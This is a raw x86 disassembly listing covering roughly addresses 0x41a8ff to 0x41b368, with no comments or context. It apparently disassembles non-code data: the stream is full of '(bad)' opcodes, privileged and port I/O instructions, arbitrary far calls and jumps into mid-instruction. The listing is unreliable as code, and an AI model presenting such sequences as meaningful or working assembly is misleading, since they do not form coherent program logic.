  41a8ff:	rcr    BYTE PTR [ecx+esi*4+0x35],cl
  41a903:	xchg   edx,eax
  41a904:	inc    ebx
  41a905:	popf   
  41a906:	cli    
  41a907:	push   ecx
  41a908:	push   edi
  41a909:	jge    0x41a90e
  41a90b:	int3   
  41a90c:	push   eax
  41a90d:	mov    bh,BYTE PTR [esp+esi*2+0x20]
  41a911:	pushf  
  41a912:	rol    BYTE PTR [ecx],cl
  41a914:	repz push es
  41a916:	pusha  
  41a917:	dec    ebp
  41a918:	sbb    al,0x83
  41a91a:	idiv   BYTE PTR [ecx]
  41a91c:	push   cs
  41a91d:	cld    
  41a91e:	jne    0x41a92d
  41a920:	aam    0xc1
  41a922:	xchg   ebp,eax
  41a923:	test   eax,0xf2a9c970
  41a928:	pop    es
  41a929:	shl    BYTE PTR [edx-0x17e8e9e4],1
  41a92f:	loop   0x41a916
  41a931:	inc    esp
  41a932:	es das 
  41a934:	adc    edx,DWORD PTR [eax-0x1a]
  41a937:	icebp  
  41a938:	imul   ebp,ebp,0x976099b7
  41a93e:	and    eax,0xdc627e
	...
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx-0x6961c20f]
  41a9c1:	mov    cl,0x86
  41a9c3:	sub    al,0x2a
  41a9c5:	and    BYTE PTR [ecx],al
  41a9c7:	add    dh,dh
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [eax-0x29d58a94],bl
  41a9d1:	push   es
  41a9d2:	sbb    ebx,ebx
  41a9d4:	iret   
  41a9d5:	ret    
  41a9d6:	cmc    
  41a9d7:	mov    cl,0xc3
  41a9d9:	mov    dh,al
  41a9db:	push   ebp
  41a9dc:	leave  
  41a9dd:	outs   dx,BYTE PTR ds:[esi]
  41a9de:	dec    ax
  41a9e0:	cmp    eax,0x7ed4e322
  41a9e5:	mov    DWORD PTR [eax+edi*8],ebp
  41a9e8:	dec    ebx
  41a9e9:	adc    al,0xa9
  41a9eb:	data16 mov fs,WORD PTR [ebx-0x29b28832]
  41a9f2:	sub    dh,BYTE PTR [ebx]
  41a9f4:	mov    WORD PTR ds:0xd2bc068,ss
  41a9fa:	xchg   edi,eax
  41a9fb:	lahf   
  41a9fc:	stos   BYTE PTR es:[edi],al
  41a9fd:	lods   eax,DWORD PTR ds:[esi]
  41a9fe:	xor    eax,0x6a189c45
  41aa03:	imul   edi,DWORD PTR [eax-0x249938e5],0xffffffdf
  41aa0a:	cmp    ecx,esp
  41aa0c:	fbld   TBYTE PTR [eax+0x50]
  41aa0f:	ret    
  41aa10:	fld    DWORD PTR [ebx-0x42]
  41aa13:	xchg   ebp,eax
  41aa14:	or     edi,esi
  41aa16:	call   0xbb02c173
  41aa1b:	dec    DWORD PTR [edi+0x70]
  41aa1e:	es aas 
  41aa20:	sbb    BYTE PTR [ebp-0x1c8e0f8c],dh
  41aa26:	adc    al,0x69
  41aa28:	mov    eax,ds:0x6b0740f0
  41aa2d:	(bad)  
  41aa2e:	jbe    0x41a9ec
  41aa30:	push   ebp
  41aa31:	mov    es,WORD PTR [esi+edi*2]
  41aa34:	ss call 0xa67c:0x6f5e287d
  41aa3c:	push   ss
  41aa3d:	js     0x41a9fe
  41aa3f:	shl    BYTE PTR [edi+0x4d],cl
  41aa42:	push   ebx
  41aa43:	mov    al,0xa1
  41aa45:	xchg   ecx,eax
  41aa46:	mov    eax,ds:0xa90a1617
  41aa4b:	lods   al,BYTE PTR ds:[esi]
  41aa4c:	sub    BYTE PTR [ebx-0x49],cl
  41aa4f:	inc    eax
  41aa50:	xor    ch,BYTE PTR [ebx+0x3f01ffa3]
  41aa56:	ins    DWORD PTR es:[edi],dx
  41aa57:	loop   0x41aab6
  41aa59:	fidiv  WORD PTR [ebx+0x39]
  41aa5c:	sub    esp,DWORD PTR [eax-0x6008595f]
  41aa62:	xor    ch,BYTE PTR [esp+ebp*2]
  41aa65:	shr    BYTE PTR [eax+ecx*1-0x6e591fa],1
  41aa6c:	dec    ebp
  41aa6d:	push   ebp
  41aa6e:	loop   0x41aaa9
  41aa70:	or     BYTE PTR [ecx-0x68e4ed56],0xe5
  41aa77:	imul   edx,DWORD PTR [esi],0x9
  41aa7a:	dec    edx
  41aa7b:	push   esi
  41aa7c:	and    DWORD PTR [esi+0x55da950a],ebp
  41aa82:	and    edx,eax
  41aa84:	(bad)  
  41aa85:	mov    edi,0x57d6f3b7
  41aa8a:	call   0xab690e74
  41aa8f:	in     eax,dx
  41aa90:	xor    eax,0x11b8eb0d
  41aa95:	xor    BYTE PTR [edx],bl
  41aa97:	punpcklbw mm1,DWORD PTR [edi-0x4a]
  41aa9b:	sub    BYTE PTR [ebp+0x4c],bl
  41aa9e:	aas    
  41aa9f:	cmp    bl,bh
  41aaa1:	hlt    
  41aaa2:	in     al,dx
  41aaa3:	push   ds
  41aaa4:	jmp    0x41aa38
  41aaa6:	in     eax,0x86
  41aaa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaa9:	inc    esi
  41aaaa:	sub    ebp,eax
  41aaac:	(bad)  
  41aaae:	loop   0x41aabf
  41aab0:	mov    eax,0xbc05aca
  41aab5:	clc    
  41aab6:	adc    BYTE PTR [ecx],ch
  41aab8:	sbb    eax,0x133295be
  41aabd:	ins    BYTE PTR es:[edi],dx
  41aabe:	sbb    eax,0xdfca10
	...
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi+0x3d]
  41ab41:	dec    ecx
  41ab42:	add    al,0x2f
  41ab44:	and    BYTE PTR [ecx],ah
  41ab46:	add    DWORD PTR [eax],eax
  41ab48:	test   BYTE PTR [eax],0x0
  41ab4b:	add    cl,ch
  41ab4d:	mov    bl,0x15
  41ab4f:	dec    ebx
  41ab50:	fsubr  QWORD PTR [ebx-0x1ebacb19]
  41ab56:	push   ebp
  41ab57:	std    
  41ab58:	cmp    dh,cl
  41ab5a:	cs test al,0x56
  41ab5d:	bound  edx,QWORD PTR ds:0xb0edceb8
  41ab63:	sbb    eax,0x7143910f
  41ab68:	dec    eax
  41ab69:	out    0x13,eax
  41ab6b:	cmp    edi,ebp
  41ab6d:	add    al,0xb8
  41ab6f:	mov    dl,0xad
  41ab71:	jns    0x41ab0b
  41ab73:	popa   
  41ab74:	mov    ss,WORD PTR [ecx+0xfdee75b]
  41ab7a:	out    dx,eax
  41ab7b:	mov    ebx,0x752e12c3
  41ab80:	dec    esp
  41ab81:	adc    ebx,DWORD PTR [edi-0x43c341e5]
  41ab87:	sbb    eax,0x761f8473
  41ab8c:	sbb    eax,0x5abfd9a5
  41ab91:	inc    esi
  41ab92:	test   eax,0xaaa0b63d
  41ab97:	mov    bl,0xc8
  41ab99:	lea    esp,[ecx-0xd]
  41ab9c:	sbb    BYTE PTR [ecx],al
  41ab9e:	xor    eax,0x50f7d5a7
  41aba3:	and    ebx,ebp
  41aba5:	or     ebx,eax
  41aba7:	out    dx,eax
  41aba8:	cmp    BYTE PTR [edi-0x49],dl
  41abab:	stc    
  41abac:	pop    ds
  41abad:	inc    edi
  41abae:	adc    al,0x33
  41abb0:	push   es
  41abb1:	jle    0x41ab4c
  41abb3:	aam    0x5e
  41abb5:	or     DWORD PTR ds:0x5dbc4b2f,0x51
  41abbc:	iretw  
  41abbe:	loope  0x41abc7
  41abc0:	xchg   ecx,eax
  41abc1:	fcom   st(7)
  41abc3:	add    eax,0xb89b7d82
  41abc8:	xchg   edx,eax
  41abc9:	das    
  41abca:	mov    dh,0xb9
  41abcc:	or     ch,BYTE PTR [ebx+0x5dd9b5ef]
  41abd2:	mov    eax,ds:0x15e7cad2
  41abd7:	adc    ah,al
  41abd9:	stos   BYTE PTR es:[di],al
  41abdb:	fsubr  DWORD PTR [ecx]
  41abdd:	scas   al,BYTE PTR es:[edi]
  41abde:	pop    edi
  41abdf:	inc    ebx
  41abe0:	add    eax,DWORD PTR [esi+0x68fc4f71]
  41abe6:	push   cs
  41abe7:	xlat   BYTE PTR ds:[ebx]
  41abe8:	(bad)  
  41abe9:	jbe    0x41ab82
  41abeb:	and    ebp,DWORD PTR [edi+0x24]
  41abee:	jmp    0x41abd4
  41abf0:	jne    0x41abce
  41abf2:	call   0x149000f1
  41abf7:	push   es
  41abf8:	inc    eax
  41abf9:	add    ebp,DWORD PTR [ebx+edi*2-0x5401e0d3]
  41ac00:	out    0x56,eax
  41ac02:	fist   WORD PTR [esp+ecx*8]
  41ac05:	in     eax,0x87
  41ac07:	xor    DWORD PTR [eax],ecx
  41ac09:	mov    ds:0x5ca9ce22,al
  41ac0e:	cld    
  41ac0f:	pop    edx
  41ac10:	nop
  41ac11:	cmp    BYTE PTR [ecx],ch
  41ac13:	test   DWORD PTR [esi+0x6f527cfd],0x9cf7a303
  41ac1d:	gs sub al,0x48
  41ac20:	mov    bh,0x73
  41ac22:	jnp    0x41ac94
  41ac24:	call   0xe807:0x382de87b
  41ac2b:	xor    al,0xa8
  41ac2d:	cld    
  41ac2e:	lea    edi,[ebp-0x39]
  41ac31:	xchg   ebx,eax
  41ac32:	vpsubusb ymm2,ymm5,YMMWORD PTR [edx+0xc7e0b07]
  41ac3a:	in     al,dx
  41ac3b:	fisub  WORD PTR [edx]
  41ac3d:	sbb    al,0xcd
  41ac3f:	mov    ss,WORD PTR [esi-0x5b]
	...
  41acb2:	add    BYTE PTR [eax],al
  41acb4:	lock xchg edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0xc48db102
  41acc3:	cld    
  41acc4:	push   ss
  41acc5:	and    al,BYTE PTR [ecx]
  41acc7:	add    dh,dh
  41acc9:	add    BYTE PTR [eax],al
  41accb:	add    cl,ah
  41accd:	mov    esp,ebp
  41accf:	scas   al,BYTE PTR es:[edi]
  41acd0:	lds    ecx,FWORD PTR ds:0x533265d5
  41acd6:	sar    BYTE PTR [edi-0x33],1
  41acd9:	or     dh,cl
  41acdb:	jge    0x41ad2a
  41acdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acde:	pop    edx
  41acdf:	scas   al,BYTE PTR es:[edi]
  41ace0:	adc    cl,BYTE PTR [edx-0x6b]
  41ace3:	je     0x41ace1
  41ace5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace6:	arpl   WORD PTR [ecx-0x3b6eb1f8],dx
  41acec:	pop    es
  41aced:	fisub  DWORD PTR [ebp+0x165c96e5]
  41acf3:	jg     0x41ad07
  41acf5:	mov    BYTE PTR [edi],bh
  41acf7:	loop   0x41acd7
  41acf9:	dec    ecx
  41acfa:	xchg   edx,eax
  41acfb:	xchg   ebp,eax
  41acfc:	(bad)  
  41acfd:	jle    0x41ad20
  41acff:	push   ss
  41ad00:	jecxz  0x41acdb
  41ad02:	add    BYTE PTR ds:0xf38b2e07,ch
  41ad08:	adc    dh,BYTE PTR [ecx+eax*1-0x2445fe84]
  41ad0f:	jne    0x41ad63
  41ad11:	mov    ah,0xc8
  41ad13:	das    
  41ad14:	mov    esi,0xe8beba55
  41ad19:	pop    es
  41ad1a:	adc    BYTE PTR [edx-0x7fa632e8],dl
  41ad20:	shl    DWORD PTR [edx*1-0x407af07f],1
  41ad27:	dec    ebx
  41ad28:	jnp    0x41ad42
  41ad2a:	push   cs
  41ad2b:	call   0x39e9f899
  41ad30:	dec    edx
  41ad31:	cmp    al,0x4f
  41ad33:	and    DWORD PTR [ebx],ebx
  41ad35:	xor    BYTE PTR [eax+0x57534f14],0x86
  41ad3c:	ins    BYTE PTR es:[edi],dx
  41ad3d:	or     al,0xac
  41ad3f:	test   eax,0x2e851d5c
  41ad44:	xor    ebp,DWORD PTR [ebx-0x203b2716]
  41ad4a:	add    BYTE PTR [ebp+0x3d],ch
  41ad4d:	in     eax,0x5a
  41ad4f:	shl    DWORD PTR [edx],0x87
  41ad52:	test   BYTE PTR [eax+0x5be456c8],ch
  41ad58:	or     al,0x63
  41ad5a:	dec    ebx
  41ad5b:	push   edi
  41ad5c:	jmp    0x286a:0xbc1f0e33
  41ad63:	cmp    ebx,DWORD PTR [edi-0x5f0c36d3]
  41ad69:	(bad)  
  41ad6a:	cmp    eax,0xd46f7230
  41ad6f:	jo     0x41adb9
  41ad71:	fdiv   DWORD PTR [ebx+ebx*4+0x521826c8]
  41ad78:	and    ah,BYTE PTR [ebp+0x31790d23]
  41ad7e:	add    esp,esi
  41ad80:	clc    
  41ad81:	adc    eax,0x9607d2e3
  41ad86:	(bad)  
  41ad87:	mov    esp,0xac5d7a6
  41ad8c:	rol    al,1
  41ad8e:	mov    ds:0x2bb366,al
  41ad93:	push   edi
  41ad94:	mov    cl,0x42
  41ad96:	mov    ch,0x75
  41ad98:	sbb    BYTE PTR [edx-0xa],0x46
  41ad9c:	(bad)
  41ada0:	dec    ebx
  41ada1:	jg     0x41ae21
  41ada3:	jge    0x41adf2
  41ada5:	fwait
  41ada6:	(bad)  
  41ada7:	sahf   
  41ada8:	lds    edi,FWORD PTR [ebp+0x7ed1140]
  41adae:	pop    edx
  41adaf:	mov    gs,WORD PTR [edx+0x32]
  41adb2:	cdq    
  41adb3:	inc    esp
  41adb4:	addr16 pop edx
  41adb6:	out    dx,eax
  41adb7:	pop    edx
  41adb8:	daa    
  41adb9:	mov    edi,0x241d556d
  41adbe:	pop    ebp
  41adbf:	pop    ebp
  41adc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc1:	(bad)  
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi-0x62888be3]
  41ae41:	out    dx,eax
  41ae42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae43:	xor    DWORD PTR [ebx+eiz*1],ecx
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	test   BYTE PTR [eax],0x0
  41ae4b:	add    BYTE PTR [ecx],bl
  41ae4d:	in     eax,dx
  41ae4e:	jg     0x41ade9
  41ae50:	add    al,0x5d
  41ae52:	out    0x17,al
  41ae54:	mov    esi,0x852580a4
  41ae59:	sbb    DWORD PTR [ebx],esi
  41ae5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae5c:	std    
  41ae5d:	push   es
  41ae5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae5f:	ret    
  41ae60:	cmp    DWORD PTR [esi],ebx
  41ae62:	es aam 0x2b
  41ae65:	and    DWORD PTR [ebp+0xe],ebx
  41ae68:	iret   
  41ae69:	jae    0x41ae09
  41ae6b:	gs push 0x74
  41ae6e:	call   0x192c:0xca5889ea
  41ae75:	std    
  41ae76:	(bad)  
  41ae77:	push   ds
  41ae78:	add    al,0x6f
  41ae7a:	xor    DWORD PTR [esi-0x182a40c5],ebp
  41ae80:	adc    ebx,DWORD PTR [eax+0x19148437]
  41ae86:	push   cs
  41ae87:	xchg   ebx,eax
  41ae88:	pop    ebp
  41ae89:	xchg   cl,cl
  41ae8b:	call   0xe794:0x36cdbc5c
  41ae92:	and    al,0x49
  41ae94:	mov    dh,0xeb
  41ae96:	dec    ebx
  41ae97:	in     eax,0xec
  41ae99:	inc    eax
  41ae9a:	or     ah,BYTE PTR [edx]
  41ae9c:	shr    BYTE PTR ss:[eax-0x56],0xd4
  41aea1:	push   0xffffff88
  41aea3:	fstp   QWORD PTR [ebp-0x69]
  41aea6:	xor    DWORD PTR [ecx+0x7ec72707],ebx
  41aeac:	ror    BYTE PTR [ebx+0xe],cl
  41aeaf:	mov    eax,ds:0xb501722c
  41aeb4:	pop    ss
  41aeb5:	xchg   ch,al
  41aeb7:	fxch   st(6)
  41aeb9:	inc    edx
  41aeba:	(bad)  
  41aebb:	mov    cs,WORD PTR [edi-0x1b]
  41aebe:	call   0xc7ac:0x4cd75645
  41aec5:	popa   
  41aec6:	idiv   BYTE PTR [ebp-0x72a2031b]
  41aecc:	pop    edi
  41aecd:	push   es
  41aece:	sbb    DWORD PTR [ecx+0x3e],esp
  41aed1:	pop    ds
  41aed2:	jp     0x41aeae
  41aed4:	aam    0xe
  41aed6:	ins    DWORD PTR es:[edi],dx
  41aed7:	push   0xffffffb7
  41aed9:	js     0x41af54
  41aedb:	push   0xb73cb173
  41aee0:	test   al,0x49
  41aee2:	jae    0x41ae94
  41aee4:	push   ss
  41aee5:	neg    BYTE PTR [esi+0x1c]
  41aee8:	xlat   BYTE PTR ds:[ebx]
  41aee9:	xchg   ebx,eax
  41aeea:	sti    
  41aeeb:	pop    esi
  41aeec:	and    ch,BYTE PTR [eax+0x6bfc3a7b]
  41aef2:	mov    WORD PTR [edi-0x34c20660],ds
  41aef8:	and    DWORD PTR [ecx-0x72],edx
  41aefb:	jnp    0x41aea6
  41aefd:	in     eax,0x53
  41aeff:	mov    ebx,0xa8a296cb
  41af04:	js     0x41af4a
  41af06:	imul   BYTE PTR [ebp+ebp*2+0x77]
  41af0a:	cmp    dh,ch
  41af0c:	ret    0x5126
  41af0f:	in     eax,0x29
  41af11:	inc    ebx
  41af12:	repz pop esp
  41af14:	mov    ds,WORD PTR [ebx]
  41af16:	jmp    0xb37e:0xd5844dc6
  41af1d:	gs mov esp,0x3d0f28a7
  41af23:	mov    al,0x94
  41af25:	fnstsw ax
  41af27:	fs hlt 
  41af29:	sar    DWORD PTR [esi],cl
  41af2b:	je     0x41af33
  41af2d:	adc    eax,0x758c94b4
  41af32:	test   DWORD PTR [ebx+0x4c],ebp
  41af35:	push   ss
  41af36:	push   edx
  41af37:	jle    0x41af60
  41af39:	rcl    ebp,0x7d
  41af3c:	pop    edi
  41af3d:	scas   al,BYTE PTR es:[edi]
  41af3e:	dec    DWORD PTR [edi+0xf]
  41af41:	sub    al,0x0
	...
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x72
  41afc1:	ins    DWORD PTR es:[edi],dx
  41afc2:	popa   
  41afc3:	imul   eax,DWORD PTR [edx],0xf6000124
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [eax+0x31ac386a],cl
  41afd1:	jmp    0xf4d0e1b6
  41afd6:	popa   
  41afd7:	adc    bl,BYTE PTR [edx]
  41afd9:	mov    bh,0xfb
  41afdb:	adc    DWORD PTR [esi+0x7cf8e835],eax
  41afe1:	pushf  
  41afe2:	mov    cs,WORD PTR [ebx-0x52ec1b24]
  41afe8:	enter  0xf9b4,0x1a
  41afec:	mov    BYTE PTR [esi],ah
  41afee:	sbb    bl,BYTE PTR [ecx-0xe4085d0]
  41aff4:	cmp    esi,esp
  41aff6:	mov    esp,0x60c4c2d5
  41affb:	fstp   TBYTE PTR [edi-0x3c]
  41affe:	ret    0xed8a
  41b001:	ret    
  41b002:	cmp    eax,0x939549b4
  41b007:	in     al,0x21
  41b009:	icebp  
  41b00a:	mov    al,ds:0xeb178b0b
  41b00f:	xchg   ah,bh
  41b011:	out    dx,eax
  41b012:	inc    eax
  41b013:	mov    dh,0x37
  41b015:	fsubr  st,st(4)
  41b017:	dec    edi
  41b018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b019:	nop
  41b01a:	jg     0x41b08a
  41b01c:	and    BYTE PTR [edx],al
  41b01e:	repz mov ecx,0x90c3b70f
  41b024:	cmp    bh,BYTE PTR [ecx+ebx*2]
  41b027:	sti    
  41b028:	ja     0x41b066
  41b02a:	add    ch,cl
  41b02c:	xor    ecx,0xcc684a4b
  41b032:	mov    esi,0x12dc2a66
  41b037:	scas   al,BYTE PTR es:[edi]
  41b038:	popf   
  41b039:	xchg   ebx,eax
  41b03a:	cmp    al,0x7a
  41b03c:	jno    0x41b03a
  41b03e:	sbb    al,0xb3
  41b040:	fs stc 
  41b042:	loop   0x41afd7
  41b044:	sbb    al,BYTE PTR [edx-0x41ecf581]
  41b04a:	dec    esi
  41b04b:	push   0x142c5914
  41b050:	xchg   BYTE PTR [edi+ebx*1],ch
  41b053:	add    eax,DWORD PTR [edx+ecx*4+0x2b]
  41b057:	xor    BYTE PTR [esi-0x75e3e13d],dh
  41b05d:	and    al,0x61
  41b05f:	das    
  41b060:	int3   
  41b061:	out    dx,al
  41b062:	jg     0x41b0c3
  41b064:	imul   edi,DWORD PTR [ebx+0x7],0xffffff8e
  41b068:	inc    eax
  41b069:	test   eax,0x4d6a4391
  41b06e:	sbb    ah,BYTE PTR [ebx-0x1d85bc62]
  41b074:	xor    eax,DWORD PTR [ecx-0x31]
  41b077:	mov    eax,0xb3f35c2b
  41b07c:	js     0x41b083
  41b07e:	aad    0xa1
  41b080:	int3   
  41b081:	sub    eax,0xc40c80a
  41b086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b087:	or     edi,DWORD PTR [esi+0x1e]
  41b08a:	pop    ebx
  41b08b:	dec    ebp
  41b08c:	push   0x5d382693
  41b091:	push   0xffffffb3
  41b093:	cmp    edi,DWORD PTR [ebx-0x7e1ea96e]
  41b099:	mov    al,bh
  41b09b:	xor    eax,0x6901a63a
  41b0a0:	xchg   edi,eax
  41b0a1:	and    DWORD PTR [edi],esi
  41b0a3:	ja     0x41b0e4
  41b0a5:	mov    dh,0x3e
  41b0a7:	xlat   BYTE PTR ds:[ebx]
  41b0a8:	xchg   ebp,eax
  41b0a9:	cwde   
  41b0aa:	xor    esp,DWORD PTR [ecx]
  41b0ac:	frstor [eax-0x55a58aa7]
  41b0b2:	push   0x21
  41b0b4:	xchg   edx,esi
  41b0b6:	push   ds
  41b0b7:	push   edx
  41b0b8:	xor    ebx,DWORD PTR [edx+0x5b]
  41b0bb:	adc    esp,DWORD PTR [edi+0x14]
  41b0be:	jp     0x41b0fb
  41b0c0:	push   ds
  41b0c1:	outs   dx,BYTE PTR ds:[esi]
	...
  41b132:	add    BYTE PTR [eax],al
  41b134:	sbb    al,0xc
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	dec    edx
  41b141:	loopne 0x41b124
  41b143:	xabort 0x24
  41b146:	add    DWORD PTR [eax],eax
  41b148:	test   BYTE PTR [eax],0x0
  41b14b:	add    BYTE PTR [ebp+0x54],dh
  41b14e:	xchg   ebx,eax
  41b14f:	sbb    dh,BYTE PTR [esi-0x25e33274]
  41b155:	dec    ebx
  41b156:	sub    eax,0xdf89d539
  41b15b:	mov    dl,0x62
  41b15d:	inc    esp
  41b15e:	or     ecx,DWORD PTR [edi+esi*8]
  41b161:	adc    esi,DWORD PTR [ebx]
  41b163:	fimul  WORD PTR [edx-0x67]
  41b166:	mov    ebx,0xc6979db2
  41b16b:	mov    cl,0xa
  41b16d:	sub    bh,BYTE PTR [edx-0x5256d52b]
  41b173:	and    al,0x9e
  41b175:	xchg   ebx,eax
  41b176:	or     esi,DWORD PTR [esi]
  41b178:	gs ins DWORD PTR es:[edi],dx
  41b17a:	adc    dl,cl
  41b17c:	xchg   esi,eax
  41b17d:	popw   es
  41b17f:	shr    DWORD PTR [edx-0x6a4dfa9b],1
  41b185:	addr16 daa 
  41b187:	mov    al,ds:0x26ec4066
  41b18c:	or     esi,DWORD PTR [edx]
  41b18e:	(bad)  
  41b18f:	ds jge 0x41b1a2
  41b192:	mov    dl,0xcf
  41b194:	jno    0x41b122
  41b196:	jo     0x41b13e
  41b198:	or     esi,0x75c20d34
  41b19e:	cmp    edx,DWORD PTR [edx-0xa268ace]
  41b1a4:	fstp   DWORD PTR [edi]
  41b1a6:	stc    
  41b1a7:	out    dx,eax
  41b1a8:	cwde   
  41b1a9:	push   ebp
  41b1aa:	xor    BYTE PTR [eax],ah
  41b1ac:	shl    DWORD PTR [eax+0x5fc8b7a4],cl
  41b1b2:	(bad)  
  41b1b4:	retf   0xde02
  41b1b7:	or     bh,cl
  41b1b9:	push   edi
  41b1ba:	ret    0xa30
  41b1bd:	xor    BYTE PTR ds:[edx],dl
  41b1c0:	push   ebx
  41b1c1:	inc    esp
  41b1c2:	lods   al,BYTE PTR ds:[esi]
  41b1c3:	pusha  
  41b1c4:	not    DWORD PTR [edx]
  41b1c6:	add    ah,BYTE PTR [eax+0x496872a3]
  41b1cc:	fs mov ebp,0x2c24b184
  41b1d2:	xor    eax,0x41e90599
  41b1d7:	outs   dx,BYTE PTR ds:[esi]
  41b1d8:	retf   0x658c
  41b1db:	jecxz  0x41b167
  41b1dd:	mov    ds:0x1df542da,al
  41b1e2:	xchg   edx,eax
  41b1e3:	push   edi
  41b1e4:	mov    edi,esi
  41b1e6:	sub    eax,0x4c2b0ffc
  41b1eb:	jp     0x41b1c0
  41b1ed:	imul   ecx,DWORD PTR [ebx+0x3f],0xffffffa7
  41b1f1:	hlt    
  41b1f2:	push   edi
  41b1f3:	test   edx,ecx
  41b1f5:	shl    DWORD PTR [edx-0x4d],0xe2
  41b1f9:	xchg   esp,eax
  41b1fa:	push   es
  41b1fb:	out    0x58,eax
  41b1fd:	int    0xbc
  41b1ff:	in     eax,dx
  41b200:	iret   
  41b201:	inc    edx
  41b202:	jno    0x41b26b
  41b204:	shl    edx,0xba
  41b207:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b208:	xchg   esp,eax
  41b209:	adc    al,0x41
  41b20b:	lods   eax,DWORD PTR ds:[esi]
  41b20c:	or     bh,BYTE PTR ds:0x3f134dd1
  41b212:	cli    
  41b213:	pushf  
  41b214:	adc    BYTE PTR [edx],ch
  41b216:	fwait
  41b217:	add    BYTE PTR [edi-0x7785204e],dl
  41b21d:	push   edi
  41b21e:	jecxz  0x41b255
  41b220:	mov    BYTE PTR [eax-0xc9d38d7],dh
  41b226:	push   ebx
  41b227:	sbb    eax,0xad0009f8
  41b22c:	sub    al,0x1c
  41b22e:	xchg   eax,ebp
  41b230:	je     0x41b1d3
  41b232:	pop    ss
  41b233:	sub    BYTE PTR [eax],ch
  41b235:	shl    cl,cl
  41b237:	sbb    ebp,DWORD PTR [eax]
  41b239:	sbb    DWORD PTR [edx],ebp
  41b23b:	cdq    
  41b23c:	ror    DWORD PTR [esi-0x7059e1e7],0x0
	...
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	xor    eax,0xeea4398c
  41b2c5:	and    eax,0xf60001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	sar    BYTE PTR [edx+ecx*8+0x14],0xa2
  41b2d1:	stc    
  41b2d2:	jae    0x41b2c4
  41b2d4:	push   cs
  41b2d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2d6:	mov    ds:0x1aca96c2,eax
  41b2db:	das    
  41b2dc:	addr16 mov bl,0xf8
  41b2df:	pop    si
  41b2e1:	xchg   edx,eax
  41b2e2:	ins    BYTE PTR es:[edi],dx
  41b2e3:	xor    eax,DWORD PTR [ecx-0x44]
  41b2e6:	push   ds
  41b2e7:	and    DWORD PTR [edi+eax*4-0x769a3817],edx
  41b2ee:	aas    
  41b2ef:	add    eax,0xc19053bd
  41b2f4:	push   esp
  41b2f5:	enter  0x5668,0x84
  41b2f9:	xor    cl,BYTE PTR [edx-0x1d]
  41b2fc:	es int3 
  41b2fe:	add    cl,dh
  41b300:	push   ecx
  41b301:	retf   
  41b302:	std    
  41b303:	pop    ebx
  41b304:	addr16 sti 
  41b306:	mov    bh,0x1b
  41b308:	push   ds
  41b309:	lahf   
  41b30a:	hlt    
  41b30b:	jno    0x41b334
  41b30d:	xchg   esp,eax
  41b30e:	sbb    ebp,ebx
  41b310:	sbb    esp,DWORD PTR [edx+edi*8-0x35]
  41b314:	jne    0x41b2b2
  41b316:	mov    esp,edx
  41b318:	dec    ecx
  41b319:	xor    DWORD PTR [ebx-0x378c46c8],ebp
  41b31f:	mov    ecx,0xe42b84ae
  41b324:	jns    0x41b346
  41b326:	and    DWORD PTR [ebx+0x7f],esi
  41b329:	add    al,0x43
  41b32b:	cmp    DWORD PTR [edi+0x25d4248c],esp
  41b331:	(bad)  
  41b332:	adc    al,0xaf
  41b334:	fs mov bh,0xe2
  41b337:	stos   DWORD PTR es:[edi],eax
  41b338:	jp     0x41b332
  41b33a:	bound  esi,QWORD PTR [ebp-0x12156060]
  41b340:	cwde   
  41b341:	js     0x41b366
  41b343:	rcl    ch,0x4
  41b346:	sbb    DWORD PTR [ebp-0x6f],esp
  41b349:	test   al,0x90
  41b34b:	retf   
  41b34c:	xlat   BYTE PTR ds:[ebx]
  41b34d:	inc    esp
  41b34e:	stc    
  41b34f:	mov    dh,0x24
  41b351:	mov    ah,BYTE PTR [ecx-0x6f]
  41b354:	daa    
  41b355:	cmc    
  41b356:	cmp    eax,0x95806716
  41b35b:	into   
  41b35c:	jnp    0x41b377
  41b35e:	sbb    ah,BYTE PTR cs:[eax-0x4d45eaec]
  41b365:	call   ebp
  41b367:	inc    ecx
  41b368:	lods   eax,DWORD PTR ds:[esi]
